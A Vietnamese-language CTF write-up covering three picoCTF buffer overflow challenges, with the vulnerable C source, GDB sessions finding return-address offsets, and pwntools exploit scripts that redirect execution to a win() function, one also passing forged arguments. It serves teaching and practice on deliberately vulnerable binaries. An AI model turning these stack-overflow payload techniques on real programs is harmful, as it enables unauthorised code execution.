---
title: Buffer Overflow series
description: Just a series of BOF
author: 5o1z
date: 2024-11-30 9:51 +0700
categories: [Practice, PicoCTF]
tags: [pwn, pwntools, code]
image:
  path: /assets/img/picoCTF/picoctf.png
---

## Buffer Overflow 0

### Description

> Let's start off simple, can you overflow the correct buffer?

### Solution

Hãy nhìn qua binary xem nó có gì:

```bash
➜  BOF_0 file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
➜  BOF_0 checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   84 Symbols        No    0               4               vuln
```

Một file ELF 32-bit và không có Stack Canary

Hãy xem qua source code có gì:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

&#x20;Ở function **sigsegv\_handler()**

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

Ta thấy  “SIGSEGV” là viết tắt cho **segmentation fault,** là một lỗi được tạo ra bởi phần cứng bảo vệ bộ nhớ mỗi khi nó cố gắng truy cập một địa chỉ bộ nhớ mà bị hạn chế hoặc không tồn tại. Nếu cờ **printf()** nằm trong **sigsegv\_handler()**, thì chúng ta có thể nghĩ đến việc cách kích hoạt **segmentation fault**.

Tiếp tục với **main()** thì function này dùng **gets()** function, một function khá nguy hiểm vì nó cho phép chúng ta nhập input mà không kiểm tra độ dài của nó. Chính vì thế mà chúng ta có thể nhập vượt quá 100 bytes và chuyển 100 bytes input nào vào function **vuln().** Input của chúng ta có thể ghi đè 16 bytes **buf2** trong vuln() và có thể dẫn đến **segmentation fault**

Vì vậy ta có thể thử cho input với độ dài là 16 bytes trước sau đó tăng lên mỗi lần 4 bytes một cho đến khi nó gây lỗi

```bash
➜  BOF_0 python3 -c "print('A'*(16+3))" | ./vuln
Input: The program will exit now
➜  BOF_0 python3 -c "print('A'*(16+4))" | ./vuln
Input: FLAG{helloiloveyou}
```

## Buffer Overflow 1

### Description

> Control the return address and arguments

### Solution

```bash
➜  BOF_1 checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               3               vuln
➜  BOF_1 file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

Đây là 1 ELF 32-bit và không có Stack Canary

Hãy xem sơ qua source code xem nó có gì:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Chương trình gọi hàm vuln() để lấy đầu vào của chúng ta, điều đặc biệt là hàm này sử dụng get(). Điều này cho phép chúng ta thực hiện buffer overflow

Trước hết hãy tìm offset của nó bằng GDB

```bash
gef➤  b*0x08049327
Breakpoint 1 at 0x8049327
gef➤  r
Starting program: /home/alter/Pico/pwn/BOF_1/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:

Breakpoint 1, 0x08049327 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1b
$ebx   : 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0xf7faf8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffccb0  →  0x0804a0a0  →  "Please enter your string: "
$ebp   : 0xffffccd8  →  0x00000000
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x08049327  →  <main+0063> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccb0│+0x0000: 0x0804a0a0  →  "Please enter your string: "  ← $esp
0xffffccb4│+0x0004: 0x000003e8
0xffffccb8│+0x0008: 0x000003e8
0xffffccbc│+0x000c: 0x08049301  →  <main+003d> mov DWORD PTR [ebp-0xc], eax
0xffffccc0│+0x0010: 0xffffffff
0xffffccc4│+0x0014: 0xf7d9696c  →  0x00000914
0xffffccc8│+0x0018: 0xf7fc1400  →  0xf7d85000  →  0x464c457f
0xffffcccc│+0x001c: 0x000003e8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804931b <main+0057>      lea    eax, [ebx-0x1f60]
    0x8049321 <main+005d>      push   eax
    0x8049322 <main+005e>      call   0x8049080 <puts@plt>
●→  0x8049327 <main+0063>      add    esp, 0x10
    0x804932a <main+0066>      call   0x8049281 <vuln>
    0x804932f <main+006b>      mov    eax, 0x0
    0x8049334 <main+0070>      lea    esp, [ebp-0x8]
    0x8049337 <main+0073>      pop    ecx
    0x8049338 <main+0074>      pop    ebx
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049327 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049327 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ni
0x0804932a in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1b
$ebx   : 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0xf7faf8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffccc0  →  0xffffffff
$ebp   : 0xffffccd8  →  0x00000000
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x0804932a  →  0xffff52e8  →  0x00000000
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccc0│+0x0000: 0xffffffff   ← $esp
0xffffccc4│+0x0004: 0xf7d9696c  →  0x00000914
0xffffccc8│+0x0008: 0xf7fc1400  →  0xf7d85000  →  0x464c457f
0xffffcccc│+0x000c: 0x000003e8
0xffffccd0│+0x0010: 0xffffccf0  →  0x00000001
0xffffccd4│+0x0014: 0xf7fade34  →  0x00228d2c
0xffffccd8│+0x0018: 0x00000000   ← $ebp
0xffffccdc│+0x001c: 0xf7da9c75  →   add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049321 <main+005d>      push   eax
    0x8049322 <main+005e>      call   0x8049080 <puts@plt>
●   0x8049327 <main+0063>      add    esp, 0x10
 →  0x804932a <main+0066>      call   0x8049281 <vuln>
   ↳   0x8049281 <vuln+0000>      endbr32
       0x8049285 <vuln+0004>      push   ebp
       0x8049286 <vuln+0005>      mov    ebp, esp
       0x8049288 <vuln+0007>      push   ebx
       0x8049289 <vuln+0008>      sub    esp, 0x24
       0x804928c <vuln+000b>      call   0x8049130 <__x86.get_pc_thunk.bx>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
vuln (
   [sp + 0x0] = 0xffffffff
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804932a in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804932a → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern create 60
[+] Generating a pattern of 60 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
[+] Saved as '$_gef0'
gef➤  ni
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0
$edx   : 0x0
$esp   : 0xffffccc0  →  "maaanaaaoaaa"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccc0│+0x0000: "maaanaaaoaaa"       ← $esp
0xffffccc4│+0x0004: "naaaoaaa"
0xffffccc8│+0x0008: "oaaa"
0xffffcccc│+0x000c: 0x00000300
0xffffccd0│+0x0010: 0xffffccf0  →  0x00000001
0xffffccd4│+0x0014: 0xf7fade34  →  0x00228d2c
0xffffccd8│+0x0018: 0x00000000
0xffffccdc│+0x001c: 0xf7da9c75  →   add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ta có thể thấy khi ta tạo 1 pattern với độ dài là 60 và input nó thì chương trình đã dừng lại tại 0x6161616c và cho ra lỗi là SIGSEGV. Điều này là do EIP đã bị ghi đè khiến cho chương trình không xác định đương câu lệnh tiếp theo nó sẽ thực hiện là gì dẫn đến việc bị chết chương trình

Ta có thể hình dung rõ hơn bằng cách nhập 1 input khác ví dụ như **helloiloveyou**&#x20;

```bash
gef➤
0x0804933d in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0
$ebx   : 0xf7fade34  →  0x00228d2c
$ecx   : 0xffffccf0  →  0x00000001
$edx   : 0x0
$esp   : 0xffffccec  →  0xf7da9c75  →   add esp, 0x10
$ebp   : 0x0
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x0804933d  →  <main+0079> ret
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccec│+0x0000: 0xf7da9c75  →   add esp, 0x10        ← $esp
0xffffccf0│+0x0004: 0x00000001
0xffffccf4│+0x0008: 0xffffcda4  →  0xffffcf07  →  "/home/alter/Pico/pwn/BOF_1/vuln"
0xffffccf8│+0x000c: 0xffffcdac  →  0xffffcf27  →  "HOSTTYPE=x86_64"
0xffffccfc│+0x0010: 0xffffcd10  →  0xf7fade34  →  0x00228d2c
0xffffcd00│+0x0014: 0xf7fade34  →  0x00228d2c
0xffffcd04│+0x0018: 0x080492c4  →  <main+0000> endbr32
0xffffcd08│+0x001c: 0x00000001
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049338 <main+0074>      pop    ebx
    0x8049339 <main+0075>      pop    ebp
    0x804933a <main+0076>      lea    esp, [ecx-0x4]
 →  0x804933d <main+0079>      ret
   ↳  0xf7da9c75                  add    esp, 0x10
      0xf7da9c78                  sub    esp, 0xc
      0xf7da9c7b                  push   eax
      0xf7da9c7c                  call   0xf7dc35c0 <exit>
      0xf7da9c81                  call   0xf7e0c9b0
      0xf7da9c86                  mov    eax, DWORD PTR [esp]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804933d in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804933d → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0xffffccf0:
 eip = 0x804933d in main; saved eip = 0xf7da9c75
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffccf0
 Saved registers:
  eip at 0xffffccec
```

Ta có thể nhìn ở stack, tại vị trí 0xffffccec nó lưu giá trị của lệnh tiếp theo sẽ được thực thi sau khi ret

hay còn gọi địa chỉ đó là địa chỉ của saved EIP. Khi ret được thực hiện, giá trị tại ESP sẽ được gán vào cho EIP và khiến luồng chương trình thực thi theo đó. Vậy điều chúng ta cần làm là kiểm soát được địa chỉ trả về của chúng sau khi ret (ở đây là hàm win) và sẽ giải quyết xong vấn đề này

```bash
gef➤  pattern offset 0x6161616c
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```

Offset từ input đến saved EIP là 44 và nhiêu đây cũng đã đủ để ta viết exploit

### Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./vuln', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x0804933d
c
''')

p = remote('saturn.picoctf.net', 59056) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

payload = b'A'*44
payload += p32(exe.sym['win'])

sla(b'string:',payload)
p.interactive()
```

```bash
➜  BOF_1 echo 'FLAG{helloiloveyou}' > flag.txt
➜  BOF_1 python3 exploit.py
[+] Starting local process '/home/alter/Pico/pwn/BOF_1/vuln': pid 3480
[!] ASLR is disabled!
[*] Switching to interactive mode

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
FLAG{helloiloveyou}
[*] Got EOF while reading in interactive
```

## Buffer Overflow 2

### Description

> Control the return address and arguments

### Solution

Các bước tìm offset đến EIP vẫn như BOF0 và BOF1 nên mình sẽ skip qua bước này

Trong source code có đoạn&#x20;

```c
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
```

Tức là khi ta ghi đè EIP với địa chỉ của hàm win thì ta cần phải truyền thêm 2 giá trị arg1 và arg2 để vượt điều kiện

Khi ta nhập 1 lượng buffer đủ nhiều để đến EIP và sau khi return nó sẽ nhảy sang hàm win. Đặc biệt ta cần phải tạo lại một cái stack cho hàm win tương tự như vậy:

![alt_text](/assets/img/picoCTF/image.png)

### Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./vuln', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*win
c
''')

p = remote('saturn.picoctf.net', 51113) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

payload = b'A'*112 # buf
payload += p32(exe.sym['win']) # EIP = win addr
payload += b'A'*4 # Junk for saved RBP
payload += p32(0xCAFEF00D) # arg1
payload += p32(0xF00DF00D) # arg2

sla(b'string:',payload)
p.interactive()

```

```bash
➜  BOF_2 python3 exploit.py
[+] Starting local process '/home/alter/Pico/pwn/BOF_2/vuln': pid 7109
[!] ASLR is disabled!
[*] Switching to interactive mode

\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA
FLAG{helloiloveyou}
```

#### Explain

Để hiểu rõ exploit hơn ta có thể dùng GDB để debug thử

* Breakpoint tại win và xem payload của chúng ta như thế nào

```bash
Breakpoint 1, 0x08049296 in win ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x81
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x2aa5c8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffccd0  →  0x41414141 ("AAAA"?)
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080493f0  →  <__libc_csu_init+0000> endbr32
$edi   : 0x2aaa9b60  →  0x00000000
$eip   : 0x08049296  →  <win+0000> endbr32
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────── stack ────
0xffffccd0│+0x0000: 0x41414141   ← $esp
0xffffccd4│+0x0004: 0xcafef00d
0xffffccd8│+0x0008: 0xf00df00d
0xffffccdc│+0x000c: 0x00000300
0xffffcce0│+0x0010: 0xffffcd00  →  0x00000001
0xffffcce4│+0x0014: 0x2aa5ae34  →  0x00228d2c
0xffffcce8│+0x0018: 0x00000000
0xffffccec│+0x001c: 0x2a856c75  →   add esp, 0x10
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049289 <__do_global_dtors_aux+0029> lea    esi, [esi+eiz*1+0x0]
    0x8049290 <frame_dummy+0000> endbr32
    0x8049294 <frame_dummy+0004> jmp    0x8049220 <register_tm_clones>
●→  0x8049296 <win+0000>       endbr32
    0x804929a <win+0004>       push   ebp
    0x804929b <win+0005>       mov    ebp, esp
    0x804929d <win+0007>       push   ebx
    0x804929e <win+0008>       sub    esp, 0x54
    0x80492a1 <win+000b>       call   0x80491d0 <__x86.get_pc_thunk.bx>
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049296 in win (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049296 → win()
────────────────────────────────────────────────────────────────────────────
gef➤  i r
eax            0x81                0x81
ecx            0x2aa5c8a0          0x2aa5c8a0
edx            0x0                 0x0
ebx            0x41414141          0x41414141
esp            0xffffccd0          0xffffccd0
ebp            0x41414141          0x41414141
esi            0x80493f0           0x80493f0
edi            0x2aaa9b60          0x2aaa9b60
eip            0x8049296           0x8049296 <win>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
gef➤  i r ebp esp
ebp            0x41414141          0x41414141
esp            0xffffccd0          0xffffccd0
gef➤  x $eip
0x8049296 <win>:        0xfb1e0ff3
```

Ta có thể thấy sau khi nhảy sang hàm win, payload của chúng ta đã ghi đè saved RBP với giá trị **0x41414141**
